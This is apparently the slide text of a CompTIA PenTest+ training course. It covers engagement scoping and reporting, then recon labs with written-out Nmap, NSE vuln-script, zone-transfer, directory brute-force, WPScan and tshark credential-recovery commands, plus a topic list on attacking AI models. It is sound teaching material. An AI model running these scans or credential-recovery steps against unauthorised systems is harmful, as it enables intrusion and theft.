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  <p:sldId id="666" r:id="rId4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Relationship Id="rId417" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide4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pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="comptia-pentest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548640"/>
            <a:ext cx="2286000" cy="11974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CompTIA PenTest+ (PT0-003)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TGS-2024044563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v1.1  ·  3 July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CERTIFICATION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Cybersecurity &amp; penetration-testing certified — offensive security and defensive operations.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penetration testing, cybersecurity and secure software engineering.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name and organisation / role.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experience with security, networking or Linux (if any).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What you want to be able to test or secure after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LMS / TMS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Access your course materials, attendance and assessment on the LMS/TMS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Portal: https://lms-tms.tertiaryinfotech.com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Download the slides and Learner Guide for reference during the open-book assessment.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3 Days, 8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3 &amp; timing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Engagement Management &amp; Reconnaissance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1: Engagement Management (Labs 1–5)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Recon &amp; Enumeration (Labs 6–14)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— Enumeration, Vulnerability Analysis &amp; Exploitation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3: Vulnerability Analysis (Labs 15–19)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4: Attacks &amp; Exploits begin (Labs 20–29)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3 — Attacks, Post-Exploitation &amp; Assessment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4: Attacks &amp; Exploits (Labs 30–32)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5: Post-Exploitation (Labs 33–37)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Final Assessment (WA + PP)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Daily timing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9:00am–6:00pm · 1-hour lunch · tea breaks within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Engagement Management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Scoping, SoW/NDA/RoE, threat modelling, MITRE ATT&amp;CK, CVSS, reporting.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Recon &amp; Enumeration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OSINT, DNS/subdomains, Shodan/Censys, Nmap, NSE, web enumeration.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Vulnerability Analysis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OpenVAS, Nikto/ZAP, Trivy/Grype, TruffleHog, finding validation.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Attacks &amp; Exploits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Metasploit, credential attacks, priv-esc, web, cloud, wireless, social eng.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Post-Exploitation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Persistence, lateral movement, pivoting, exfiltration, cleanup.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Place phones and other materials under the table or on the floor.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photos or recording of assessment scripts.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discussion during the assessment.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Use a black/blue pen for hard-copy assessments.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liquid paper / correction tape.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Scripts are collected when time is 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(WA) — Short-Answer Questions (SAQ), 1 hour,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Practical Performance (PP) — hands-on penetration-testing tasks on Kali Linux, 1 hour,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Format: Open Book —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An appeal process is available if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Penetration Testing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Penetration Testing?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Authorised attack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scoped, legal simulation of a real attacker to find exploitable weaknesses.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Goal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Prove impact and give the client prioritised, actionable remediation — not just a scan.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Authorisation first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signed Rules of Engagement is what separates a pentest from a crime.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PT0-003 role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Plan, scan, exploit, move laterally and report — end to end.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Penetration Testing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Plan &amp; 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Scope, RoE, threat model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Passive &amp; active recon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Enumerate the attack surface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Find &amp; exploit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Vulnerability discovery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Validate findings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Exploit to gain access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Deepen &amp;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Privilege escalation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Lateral movement &amp; pivoting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Cleanup, then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Recon, exploit, escalate,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The five PT0-003 domains follow the real attack chain — from a signed scope to a remediation report.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Passive vs active reconnaissance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Stealthy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Passive recon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No packets to the target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OSINT, WHOIS, DNS, Shodan, CT logs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Low risk of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Active recon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Directly probes the target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Nmap, NSE, web enumeration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Must stay within the RoE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WORKBENCH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Your Toolkit — Kali Linux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Kali Linux bundles the industry-standard offensive-security toolchain, pre-installed and ready.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Run it via the Killercoda browser playground, a VM, WSL2 or the Kali Docker image.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Nmap, Metasploit, Burp Suite, hashcat, Aircrack-ng and hundreds more — install extras with apt.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Every lab in this course runs on Kali against authorised, isolated practice targets.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METHODOLOGY &amp; SCANNING  ·  OBJ 1.3 / 3.1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Testing Frameworks &amp; Scan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Methodologies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PTES (7-phase process), OSSTMM, NIST SP 800-115, CREST — make the engagement systematic and defensible.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Web &amp; mobile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OWASP Top 10 + WSTG (web) and MASVS (mobile); MITRE ATT&amp;CK maps actions to real adversary techniques.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Threat &amp; OT models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STRIDE / DREAD for threat modelling; the Purdue model structures OT/ICS networks.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SAST vs DAST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SAST reads source code (early, more false positives); DAST tests the running app from outside (ZAP, Nikto).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IAST &amp; SCA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IAST instruments the running app; SCA (Trivy, Grype) inventories dependencies and flags known-CVE components.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Scan modes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Authenticated vs unauthenticated; extend to IaC and container images for full-stack coverage.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OBJ 4.9 — SPECIALIZED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Specialized Systems &amp; Emerging Targets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Mobile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MobSF, Frida, Drozer, ADB — insecure storage, hardcoded secrets, weak cert pinning, permission abuse; jailbreak/root to bypass controls.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IoT / OT / ICS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Fragile, low-auth protocols (Modbus, DNP3, CAN bus); capture, replay and register manipulation — never disrupt safety-critical processes.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AI / ML  (new)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Prompt injection (direct/indirect), model manipulation &amp; data poisoning, guardrail bypass, training-data extraction, model supply chain.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RF / NFC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Wardriving, RFID/badge cloning, Bluejacking and Bluetooth attacks against physical and wireless entry points.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Engagement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Pre-engagement · SoW / NDA / RoE · Threat Modelling · MITRE ATT&amp;CK · CVSS · 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13%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Engagement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penetration test is an authorised, scoped simulated attack; the signed Rules of Engagement (RoE) and authorisation letter are what make it legal, not a crime.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Pre-engagement defines scope with three documents: the NDA (confidentiality), the Statement of Work (targets, methodology, schedule, fees) and the Rules of Engagement (windows, allowed/forbidden actions, stop conditions).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Threat modelling (STRIDE, DREAD) and MITRE ATT&amp;CK give a structured, adversary-realistic view of what to test and how findings map to real tactics and techniques.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Findings are prioritised with CVSS base/temporal scores, CWE weakness types and EPSS exploit-likelihood, then communicated in a report with an executive summary and remediation.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Engagement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Scoping a Pentest: SoW, NDA and Rules of Engagement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Threat Modeling with STRIDE and DREAD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3–4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Mapping a Pentest to MITRE ATT&amp;CK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Risk Scoring with CVSS, CWE and EPSS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5–5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Writing a Penetration Test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Scoping a Pentest: SoW, NDA and Rules of Engagement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reads a vague client brief, extracts the four scoping pillars, and drafts the three foundational pre-engagement documents (NDA, SoW, RoE) before self-checking against PTES.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NDA, a scoped Statement of Work, and a Rules of Engagement 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NDA, SoW, RoE, PTES, OWASP WSTG, OWASP API Security Top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Scoping a Pentest: SoW, NDA and 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Scoping a Pentest: SoW, NDA and Rules of Engagement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Read the client brief and identify targets, exclusions, cases, window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Scoping a Pentest: SoW, NDA and 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Scoping a Pentest: SoW, NDA and Rules of Engagement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engagement working directory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mkdir -p ~/engagements/acme &amp;&amp; cd ~/engagements/acme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Scoping a Pentest: SoW, NDA and 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Scoping a Pentest: SoW, NDA and Rules of Engagement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Draft the Non-Disclosure Agreement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nano nda.md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Scoping a Pentest: SoW, NDA and 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Scoping a Pentest: SoW, NDA and Rules of Engagement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Draft the Statement of Work with in-scope targets and schedule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nano sow.md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Scoping a Pentest: SoW, NDA and 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Scoping a Pentest: SoW, NDA and Rules of Engagement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Draft the Rules of Engagement with authorised testers and windows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nano roe.md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Scoping a Pentest: SoW, NDA and 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Scoping a Pentest: SoW, NDA and Rules of Engagement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List allowed and forbidden activities plus stop conditions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Scoping a Pentest: SoW, NDA and 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Scoping a Pentest: SoW, NDA and Rules of Engagement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Self-check the three documents against the PTES pre-engagement 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Scoping a Pentest: SoW, NDA and Rules of Engagement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Confirm the three documents together cover every PTES pre-engagement item: scope, schedule, IP whitelist, emergency contacts, payment, NDA, and signed authorisation.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Threat Modeling with STRIDE and DREAD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draws a data-flow diagram of a login application, enumerates threats per element with STRIDE, scores them with DREAD, and versions the exported model in the engagement Git repo.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data-flow diagram, a STRIDE threat table, and a DREAD-scored triage queue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STRIDE, DREAD, OWASP Threat Dragon, PTES, OWASP Top 10, MITRE ATT&amp;CK, Git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Threat Modeling with STRIDE and DR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Threat Modeling with STRIDE and DREAD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Draw the data-flow diagram with trust boundaries in Threat Dragon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Threat Modeling with STRIDE and DR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Threat Modeling with STRIDE and DREAD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Enumerate threats per element using the six STRIDE categories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Threat Modeling with STRIDE and DR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Threat Modeling with STRIDE and DREAD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Score at least five threats across the five DREAD dimensions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Threat Modeling with STRIDE and DR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Threat Modeling with STRIDE and DREAD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Flag any threat averaging 7 or above as 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Threat Modeling with STRIDE and DR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Threat Modeling with STRIDE and DREAD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Note where STRIDE, DREAD, PTES, OWASP and ATT&amp;CK each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Threat Modeling with STRIDE and DR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Threat Modeling with STRIDE and DREAD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Export the Threat Dragon model to JSON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cp ~/Downloads/acme-login-threatmodel.json ~/engagements/acme/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Threat Modeling with STRIDE and DR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Threat Modeling with STRIDE and DREAD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Commit the threat model to the engagement Git repo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cd ~/engagements/acme &amp;&amp; git init &amp;&amp; git add . &amp;&amp; git commit -m 'Initial threat model'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Threat Modeling with STRIDE and DREAD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Confirm the DFD, the STRIDE table and a DREAD triage queue exist, and the exported JSON model is committed alongside the SoW.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Mapping a Pentest to MITRE ATT&amp;CK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uses the MITRE ATT&amp;CK Navigator to map a phishing-to-exfiltration kill chain to Tactic, Technique and Sub-technique IDs, then scores, colours and exports the layer with detections and mitigations.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scored, colour-coded ATT&amp;CK Navigator layer exported as SVG and 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MITRE ATT&amp;CK Navigator, Cyber Kill Chain, OWASP Top 10, PTES, NIST SP 800-115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Mapping a Pentest to MITRE ATT&amp;CK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Mapping a Pentest to MITRE ATT&amp;CK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new Enterprise layer in ATT&amp;CK Navigator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Mapping a Pentest to MITRE ATT&amp;CK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Mapping a Pentest to MITRE ATT&amp;CK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Map the kill chain to Tactic, Technique and Sub-technique IDs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Mapping a Pentest to MITRE ATT&amp;CK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Mapping a Pentest to MITRE ATT&amp;CK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selected techniques to the layer with a score of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Mapping a Pentest to MITRE ATT&amp;CK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Mapping a Pentest to MITRE ATT&amp;CK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Set a colour gradient and score each technique to build the heatmap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Mapping a Pentest to MITRE ATT&amp;CK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Mapping a Pentest to MITRE ATT&amp;CK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Export the layer to SVG for the report and JSON for the folder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Mapping a Pentest to MITRE ATT&amp;CK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Mapping a Pentest to MITRE ATT&amp;CK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Open a technique cell to review detections and mitigations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Mapping a Pentest to MITRE ATT&amp;CK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Mapping a Pentest to MITRE ATT&amp;CK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Copy a technique's mitigation list into the draft Recommendations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Mapping a Pentest to MITRE ATT&amp;CK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Confirm the kill chain is mapped to correct ATT&amp;CK IDs and a scored, coloured layer is exported as both SVG and JSON with mitigations captured.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 Scoring with CVSS, CWE and EPSS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looks up three real CVEs, re-derives their CVSS v3.1 base scores from the vector strings, and builds a prioritised remediation table combining CVSS, CWE, EPSS and CISA KEV.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CVSS/CWE/EPSS/KEV prioritisation table and a written remediation recommendation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CVSS v3.1, CWE, EPSS, CISA KEV, NVD, FIRST CVSS calculator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Risk Scoring with CVSS, CWE and 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 Scoring with CVSS, CWE and EPSS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Open the NVD, CVSS 3.1, EPSS and CWE web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Risk Scoring with CVSS, CWE and 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 Scoring with CVSS, CWE and EPSS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Score CVE-2024-3094 and translate its CVSS vector string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Risk Scoring with CVSS, CWE and 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 Scoring with CVSS, CWE and EPSS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Score CVE-2017-0144 (EternalBlue) and note its CISA KEV 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Risk Scoring with CVSS, CWE and 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 Scoring with CVSS, CWE and EPSS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Score CVE-2014-6271 (Shellshock) with CWE and EPSS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Risk Scoring with CVSS, CWE and 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 Scoring with CVSS, CWE and EPSS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the ranked prioritisation table across CVSS, EPSS, KEV, CWE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Risk Scoring with CVSS, CWE and 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 Scoring with CVSS, CWE and EPSS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Apply the CVSS/EPSS/KEV rules of thumb to set fix urgency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Risk Scoring with CVSS, CWE and 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 Scoring with CVSS, CWE and EPSS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the Shellshock finding as a remediation with compensating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 Scoring with CVSS, CWE and EPSS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Confirm each CVSS vector re-derives to the published base score and the ranked table justifies fix urgency using CVSS, EPSS and CISA KEV together.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Writing a Penetration Test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writes a deliverable-grade Markdown pentest report with all standard sections, converts it to PDF and DOCX with pandoc, trials Dradis CE for team reporting, and runs a peer-review checklist.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delivery-grade pentest report in Markdown, PDF and DOCX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pandoc, texlive-xetex, Dradis CE, PTES, OWASP WSTG, CVSS, MITRE ATT&amp;CK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Writing a Penetration Test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Writing a Penetration Test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pandoc and the LaTeX PDF engine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apt update &amp;&amp; sudo apt install -y pandoc texlive-xetex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Writing a Penetration Test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Writing a Penetration Test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report skeleton in the report directory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mkdir -p ~/engagements/acme/report &amp;&amp; cd ~/engagements/acme/report &amp;&amp; nano report.md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Writing a Penetration Test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Writing a Penetration Test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exec summary, methodology, scope and limitations sections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Writing a Penetration Test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Writing a Penetration Test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detailed findings with CVSS, CWE, ATT&amp;CK, impact and fix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Writing a Penetration Test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Writing a Penetration Test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Convert the Markdown report to a delivery-grade PDF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pandoc report.md -o report.pdf --pdf-engine=xelatex -V geometry:margin=2cm -V mainfont='DejaVu Sans'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Writing a Penetration Test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Writing a Penetration Test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Convert the report to DOCX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pandoc report.md -o report.docx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Writing a Penetration Test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Writing a Penetration Test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Trial Dradis CE for collaborative team reporting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docker run --rm -p 3000:3000 dradis/dradis-ce:latest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Writing a Penetration Test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Writing a Penetration Test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Walk through the peer-review and secure-distribution checklist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Writing a Penetration Test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Confirm the report renders to a delivery-grade PDF and DOCX with all PT0-003 sections and passes the peer-review, business-risk and secure-distribution checklist gates.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Engagement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Summarize pre-engagement activities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Compare and contrast testing frameworks and methodologies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Analyze findings and prioritize attacks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Assemble report components and communicate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Reconnaissance and Enumeration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OSINT · WHOIS &amp; DNS · Subdomains · Shodan/Censys · Nmap · NSE · Web Enum · Scripting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21%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Reconnaissance and Enumeration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Passive reconnaissance gathers intelligence without touching the target (OSINT, WHOIS, DNS, certificate transparency, Shodan/Censys); active reconnaissance probes it directly (scanning, enumeration).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DNS and subdomain enumeration (theHarvester, Amass, Subfinder, zone transfers) expand the attack surface from one domain to many hosts and services.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Nmap discovers live hosts, open ports and service versions; the Nmap Scripting Engine (NSE) enumerates services and detects known issues.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Web enumeration (Gobuster, Wfuzz, WhatWeb) and lightweight Bash/Python scripting turn raw recon into a structured, repeatable target list.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Reconnaissance and Enumeration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6–8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Passive OSINT with theHarvester and Recon-ng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WHOIS, DNS Recon and Zone Walking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Subdomain Enumeration with Amass and Subfinder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9–11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Shodan, Censys and Certificate Transparency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Network Scanning with Nmap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Service Enumeration with Nmap NSE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12–14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Traffic Capture and Analysis with Wireshark and tcpdump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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Recon Scripting with Bash and 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Passive OSINT with theHarvester and Recon-ng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collects emails, subdomains and IPs from public sources with theHarvester, chains free Recon-ng modules in a workspace, and exports an HTML OSINT report without touching the target.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emails/hosts/IPs OSINT dataset and an exported HTML recon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theHarvester, Recon-ng, crt.sh, passive DNS, Firefox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Passive OSINT with theHarvester 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Passive OSINT with theHarvester and Recon-ng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theHarvester and Recon-ng on Kali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apt update &amp;&amp; sudo apt install -y theharvester recon-ng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Passive OSINT with theHarvester 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Passive OSINT with theHarvester and Recon-ng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Gather emails and hosts with theHarvester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theHarvester -d example.com -b duckduckgo,crtsh,hackertarget,rapiddns -l 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Passive OSINT with theHarvester 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Passive OSINT with theHarvester and Recon-ng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Save theHarvester output for correlation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theHarvester -d example.com -b crtsh,rapiddns -f example-osint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Passive OSINT with theHarvester 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Passive OSINT with theHarvester and Recon-ng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Recon-ng workspace and install modules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recon-ng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Passive OSINT with theHarvester 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Passive OSINT with theHarvester and Recon-ng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the hackertarget hosts module on the domain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modules load recon/domains-hosts/hackertarget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Passive OSINT with theHarvester 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Passive OSINT with theHarvester and Recon-ng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Chain threatcrowd and certificate_transparency feeds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modules load recon/domains-hosts/certificate_transparency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Passive OSINT with theHarvester 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Passive OSINT with theHarvester and Recon-ng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Show the combined hosts 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show hosts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Passive OSINT with theHarvester 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Passive OSINT with theHarvester and Recon-ng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Export an HTML report and open it in Firefox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modules load reporting/html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Passive OSINT with theHarvester and Recon-ng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Confirm theHarvester and Recon-ng enumerate emails and subdomains from public indexes only and produce an HTML OSINT report, with no packet sent to the target.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WHOIS, DNS Recon and Zone Walking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maps a target's DNS footprint with whois, dig, dnsenum and dnsrecon, tests for AXFR zone transfer, and walks an NSEC-signed zone to identify reportable misconfigurations.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DNS record map, a successful AXFR zone dump, and an NSEC zone walk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whois, dig, dnsenum, dnsrecon, ldns-walk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WHOIS, DNS Recon and Zone Walking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WHOIS, DNS Recon and Zone Walking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Query registrar and name servers with WHOIS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whois example.com | head -40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WHOIS, DNS Recon and Zone Walking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WHOIS, DNS Recon and Zone Walking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Pull A, MX, NS and TXT records with dig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dig zonetransfer.me A; dig zonetransfer.me MX; dig zonetransfer.me NS +short; dig zonetransfer.me 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WHOIS, DNS Recon and Zone Walking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WHOIS, DNS Recon and Zone Walking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Perform a reverse DNS lookup on an IP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dig -x 8.8.8.8 +short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WHOIS, DNS Recon and Zone Walking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WHOIS, DNS Recon and Zone Walking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Attempt an AXFR zone transfer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dig axfr @nsztm1.digi.ninja zonetransfer.me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WHOIS, DNS Recon and Zone Walking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WHOIS, DNS Recon and Zone Walking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Automate enumeration with dnsenum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dnsenum --output zonetransfer.xml zonetransfer.me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WHOIS, DNS Recon and Zone Walking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WHOIS, DNS Recon and Zone Walking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std, axfr and brute modes with dnsrecon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dnsrecon -d zonetransfer.me -t brt -D /usr/share/wordlists/dnsmap.txt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WHOIS, DNS Recon and Zone Walking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WHOIS, DNS Recon and Zone Walking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Detect DNSSEC keys with dig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dig zonetransfer.me +dnssec +short; dig DNSKEY zonetransfer.me +short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WHOIS, DNS Recon and Zone Walking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WHOIS, DNS Recon and Zone Walking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Walk an NSEC-signed zone with ldns-walk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ldns-walk zonetransfer.me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WHOIS, DNS Recon and Zone Walking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Confirm the AXFR returns the full zone and ldns-walk enumerates every NSEC record, both reportable DNS misconfigurations.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Subdomain Enumeration with Amass and Subfinder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enumerates subdomains from passive sources with Subfinder, Assetfinder and Amass, brute-forces with active Amass, then filters to live HTTP hosts and screenshots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deduped subdomain list, a live-hosts file, and a gowitness screenshot gallery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Amass, Subfinder, Assetfinder, httpx, gowitness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Subdomain Enumeration with Amass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Subdomain Enumeration with Amass and Subfinder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amass, subfinder and assetfinder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apt update &amp;&amp; sudo apt install -y amass subfinder assetfinder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Subdomain Enumeration with Amass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Subdomain Enumeration with Amass and Subfinder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Enumerate passive sources with Subfinder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subfinder -d owasp.org -all -silent | tee subs-subfinder.txt | wc -l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Subdomain Enumeration with Amass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Subdomain Enumeration with Amass and Subfinder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Cross-check subdomains with Assetfinder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assetfinder --subs-only owasp.org | sort -u &gt; subs-assetfinder.txt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Subdomain Enumeration with Amass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Subdomain Enumeration with Amass and Subfinder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OWASP Amass passive enumeration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amass enum -passive -d owasp.org -o subs-amass.txt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Subdomain Enumeration with Amass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Subdomain Enumeration with Amass and Subfinder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Combine and de-duplicate all sources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subs-*.txt | sort -u &gt; subs-all.txt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Subdomain Enumeration with Amass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Subdomain Enumeration with Amass and Subfinder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Brute-force subdomains with active Amass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amass enum -active -d owasp.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o subs-active.txt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Subdomain Enumeration with Amass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Subdomain Enumeration with Amass and Subfinder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Probe alive HTTP/HTTPS hosts with httpx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subs-all.txt | httpx -silent -status-code -title -tech-detect -o alive.txt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Subdomain Enumeration with Amass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Subdomain Enumeration with Amass and Subfinder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Screenshot live hosts with gowitness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gowitness file -f alive.txt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Subdomain Enumeration with Amass and Subfinder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Confirm the merged subdomain list resolves to live hosts in alive.txt and gowitness produces a screenshot gallery for the report appendix.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Shodan, Censys and Certificate Transparency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uses the Shodan and Censys APIs and crt.sh to enumerate a target's internet-visible assets without scanning, then merges the three sources into one deduped asset CSV.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deduped internet-visible attack-surface CSV from three OSINT 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Shodan CLI, Censys CLI, crt.sh, curl, jq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Shodan, Censys and Certificate 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Shodan, Censys and Certificate Transparency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and initialise the Shodan CLI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pip install shodan; shodan init &lt;YOUR_API_KEY&gt;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Shodan, Censys and Certificate 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Shodan, Censys and Certificate Transparency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Search Shodan by org, hostname and vuln filters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shodan search 'org:"OWASP"'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Shodan, Censys and Certificate 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Shodan, Censys and Certificate Transparency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Download and parse Shodan results to JSON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shodan download owasp 'org:"OWASP"'; shodan parse --fields ip_str,port,product,version owasp.json.gz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Shodan, Censys and Certificate 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Shodan, Censys and Certificate Transparency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Configure and query the Censys CLI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censys config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Shodan, Censys and Certificate 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Shodan, Censys and Certificate Transparency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Find assets by TLS common name in Censys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censys search 'services.tls.certificates.leaf_data.subject.common_name="*.owasp.org"' --pages 1 | jq '.[] | .ip'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Shodan, Censys and Certificate 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Shodan, Censys and Certificate Transparency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Extract subdomains from crt.sh CT logs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-s 'https://crt.sh/?q=%25.owasp.org&amp;output=json' | jq -r '.[].name_value' | sort -u | head -20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Shodan, Censys and Certificate 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Shodan, Censys and Certificate Transparency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Merge sources into a deduped asset CSV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sort -u assets.csv &gt; assets-dedup.csv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Shodan, Censys and Certificate Transparency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Confirm the three OSINT sources merge into one deduped assets CSV describing the internet-visible attack surface, all gathered without scanning the target.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Scanning with Nmap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uses Nmap to sweep for live hosts, run SYN and UDP port scans, detect services and OS with version and default scripts, and export results to XML/HTML for the report.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full TCP/UDP scan with service, OS and script data saved in all formats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Nmap, Docker, xsltproc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Network Scanning with Nmap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Scanning with Nmap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Launch a vulnerable Docker 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docker run --rm -d --name target -p 2222:22 -p 8080:80 -p 8443:443 vulhub/openssh:5.3p1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Network Scanning with Nmap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Scanning with Nmap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Sweep for live hosts with a ping scan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nmap -sn 192.168.1.0/24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Network Scanning with Nmap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Scanning with Nmap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a fast all-ports SYN scan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nmap -sS -p- --min-rate 1000 -T4 $TARGET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Network Scanning with Nmap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Scanning with Nmap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Scan the top UDP ports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nmap -sU --top-ports 50 $TARGET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Network Scanning with Nmap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Scanning with Nmap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Detect service versions with default scripts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nmap -sV -sC -p 22,80,443,2222,8080,8443 $TARGET -oA target-scan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Network Scanning with Nmap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Scanning with Nmap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Fingerprint the operating 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nmap -O $TARGET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Network Scanning with Nmap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Scanning with Nmap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Convert the XML scan to an HTML report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xsltproc target-scan.xml -o target-scan.html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Scanning with Nmap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Confirm the scan reports open ports, service versions and an OS guess, and that target-scan.html renders as a report appendix.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Enumeration with Nmap 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drives the Nmap Scripting Engine to enumerate HTTP, SMB, TLS, SMTP and SNMP, cross-checks SMB with enum4linux-ng and smbclient, and runs known-vulnerability scripts.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Deep NSE service enumeration with SMB shares/users and CVE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Nmap NSE, enum4linux-ng, smbclient, onesixtyone, snmpwalk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Service Enumeration with Nmap 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Enumeration with Nmap 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Spin up the Metasploitable3 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docker run --rm -d --name msf3 -p 0.0.0.0:0:0 rapid7/metasploitable3-ub1404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Service Enumeration with Nmap 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Enumeration with Nmap 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Enumerate HTTP with NSE scripts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nmap -p 80,8080,8585 --script "http-title,http-headers,http-enum,http-robots.txt" $TARGET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Service Enumeration with Nmap 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Enumeration with Nmap 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Enumerate SMB shares, users and security mode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nmap -p 139,445 --script "smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode" $TARGET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Service Enumeration with Nmap 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Enumeration with Nmap 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Cross-check SMB with enum4linux-ng and smbclient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enum4linux-ng -A $TARGET; smbclient -L //$TARGET/ -N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Service Enumeration with Nmap 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Enumeration with Nmap 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Audit SSL/TLS ciphers and Heartbleed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nmap -p 443,8443 --script "ssl-enum-ciphers,ssl-cert,ssl-heartbleed" $TARGET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Service Enumeration with Nmap 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Enumeration with Nmap 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known-vulnerability SMB and HTTP scripts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nmap -p 445 --script "smb-vuln-ms17-010,smb-vuln-cve-2009-3103" $TARGET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Service Enumeration with Nmap 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Enumeration with Nmap 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Enumerate SNMP with NSE and snmpwalk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nmap -sU -p 161 --script "snmp-info,snmp-sysdescr,snmp-interfaces" $TARGET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Service Enumeration with Nmap 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Enumeration with Nmap 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the all-in-one vuln category scan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nmap -sV --script "vuln" -oA target-vuln $TARGET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Enumeration with Nmap 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Confirm NSE lists SMB shares/users, flags TLS misconfigurations, and prints VULNERABLE blocks for known CVEs promotable straight to the report.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Traffic Capture and Analysis with Wireshark and tcpdump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captures live network traffic with tcpdump and Wireshark, applies display filters to isolate protocols, follows a TCP stream end to end, recovers cleartext credentials from a capture, and extracts fields and objects from the CLI with tshark.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pcap capture, filtered protocol views, a followed TCP stream and recovered cleartext credentials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Wireshark, tshark, tcpdump, Kali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Traffic Capture and Analysis with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Traffic Capture and Analysis with Wireshark and tcpdump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Wireshark, tshark and tcpdump on Kali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apt update &amp;&amp; sudo apt install -y wireshark tshark tcpdump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Traffic Capture and Analysis with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Traffic Capture and Analysis with Wireshark and tcpdump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Capture live traffic on the LAN interface to a pcap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tcpdump -i eth0 -w capture.pcap -c 2000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Traffic Capture and Analysis with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Traffic Capture and Analysis with Wireshark and tcpdump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Open the capture and apply protocol display filters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wireshark capture.pcap   # filters:  http || dns || ftp || tcp.port==23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Traffic Capture and Analysis with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Traffic Capture and Analysis with Wireshark and tcpdump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Isolate a cleartext service and follow its TCP stream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# Wireshark: right-click a packet &gt; Follow &gt; TCP Stream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Traffic Capture and Analysis with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Traffic Capture and Analysis with Wireshark and tcpdump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Recover cleartext FTP credentials with tshark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tshark -r capture.pcap -Y 'ftp.request.command in {USER PASS}' -T fields -e ftp.request.command -e ftp.request.arg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Traffic Capture and Analysis with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Traffic Capture and Analysis with Wireshark and tcpdump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Extract HTTP hosts, URIs and TCP conversations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tshark -r capture.pcap -q -z conv,tcp; tshark -r capture.pcap -Y http.request -T fields -e http.host -e http.request.uri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Traffic Capture and Analysis with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Traffic Capture and Analysis with Wireshark and tcpdump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Spot on-path/ARP poisoning in the capture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tshark -r capture.pcap -Y 'arp.duplicate-address-detected || arp.opcode==2'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Traffic Capture and Analysis with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Traffic Capture and Analysis with Wireshark and tcpdump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Export transferred HTTP objects for the report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tshark -r capture.pcap --export-objects http,./http_objects &amp;&amp; ls http_objects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Traffic Capture and Analysis with Wireshark and tcpdump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Confirm you can filter a capture to a single protocol, follow a TCP stream end to end, and recover cleartext credentials from the pcap — the packet-analysis skill on-path attacks and the exam rely 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Web Enumeration: Gobuster, Wfuzz, WhatWeb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fingerprints a web stack with WhatWeb, reads exposed files, brute-forces directories and parameters with Gobuster, ffuf and Wfuzz, enumerates vhosts, and scans WordPress with WPScan.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web app tech profile, directory/parameter/vhost lists, and WPScan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WhatWeb, Gobuster, ffuf, Wfuzz, WPScan, curl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Web Enumeration: Gobuster, Wfuzz,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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Spin up the DVWA target in Docker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docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa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Web Enumeration: Gobuster, Wfuzz,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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Fingerprint the stack with WhatWeb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whatweb -v $TARGET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Web Enumeration: Gobuster, Wfuzz,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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Read robots.txt, sitemap and exposed .git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-s $TARGET/robots.txt; curl -s $TARGET/.git/HEAD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Web Enumeration: Gobuster, Wfuzz,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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Brute-force directories with Gobuster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gobuster dir -u $TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 50 -o gobuster.txt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Web Enumeration: Gobuster, Wfuzz,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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Fuzz request parameters with Wfuzz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wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 "$TARGET/vulnerabilities/sqli/?FUZZ=1"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Web Enumeration: Gobuster, Wfuzz,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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Enumerate virtual hosts with Gobuster vhost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gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt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Web Enumeration: Gobuster, Wfuzz,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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Enumerate WordPress plugins, themes and users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wpscan --url https://wp.example.com --enumerate vp,vt,u --random-user-agent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Web Enumeration: Gobuster, Wfuzz, WhatWeb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Confirm WhatWeb identifies the stack, Gobuster and Wfuzz reveal hidden paths and parameters, and WPScan enumerates WordPress users, plugins and themes.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Recon Scripting with Bash and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writes and modifies a Bash bulk DNS resolver and a Python threaded TCP port scanner, then extends them with banner grabbing and the scapy and requests libraries.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Bash DNS-resolver script and a Python threaded TCP port scanner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Bash, dig, Python, socket, scapy, requests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Recon Scripting with Bash and Pyth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Recon Scripting with Bash and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scripts working directory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mkdir -p ~/scripts &amp;&amp; cd ~/scripts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Recon Scripting with Bash and Pyth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Recon Scripting with Bash and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a Bash while-read DNS resolver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nano resolve.sh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Recon Scripting with Bash and Pyth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Recon Scripting with Bash and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the resolver over a subdomain list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chmod +x resolve.sh; ./resolve.sh subs.txt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Recon Scripting with Bash and Pyth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Recon Scripting with Bash and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Modify the script to add MX records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mx=$(dig +short "$host" MX | head -1)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Recon Scripting with Bash and Pyth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Recon Scripting with Bash and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a Python threaded TCP port scanner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nano portscan.py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Recon Scripting with Bash and Pyth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Recon Scripting with Bash and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the port scanner against a host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./portscan.py 127.0.0.1 20-100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Recon Scripting with Bash and Pyth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Recon Scripting with Bash and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Extend the scanner with banner grabbing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s.send(b'HEAD / HTTP/1.0\r\n\r\n'); return s.recv(256).decode(errors='ignore').splitlines()[0]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Recon Scripting with Bash and Pyth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Recon Scripting with Bash and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Automate recon with scapy and requests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reply = sr1(IP(dst='8.8.8.8')/ICMP(), timeout=1, verbose=0)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Recon Scripting with Bash and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Confirm resolve.sh writes a subdomain,ip CSV and portscan.py prints the open ports for a host, demonstrating the read-and-modify skill the exam tests.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Reconnaissance and Enumeration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Apply information-gathering techniques; tools for recon and enumeration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Information gathering (DNS/reverse DNS) and DNS enumeration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Enumeration (DNS enumeration, host discovery) and tools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OSINT via search engines and certificate transparency logs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Network reconnaissance and TCP/UDP protocol scanning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Service/protocol/share enumeration with Nmap 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Vulnerability Discovery and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OpenVAS · Nikto &amp; ZAP · Trivy &amp; Grype · TruffleHog · Validation &amp; Exploit Selection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17%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Vulnerability Discovery and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Vulnerability scanning (Greenbone/OpenVAS) automates the discovery of missing patches, weak configurations and known CVEs across the network.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Web, container-image and secrets scanning (Nikto, ZAP, Trivy, Grype, TruffleHog) each target a different layer of a modern application stack.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Scanners produce false positives; every finding must be manually validated before it is reported or exploited.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Public exploit selection (Exploit-DB, searchsploit, Metasploit) requires matching the exact service version and understanding the exploit's impact before running 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Vulnerability 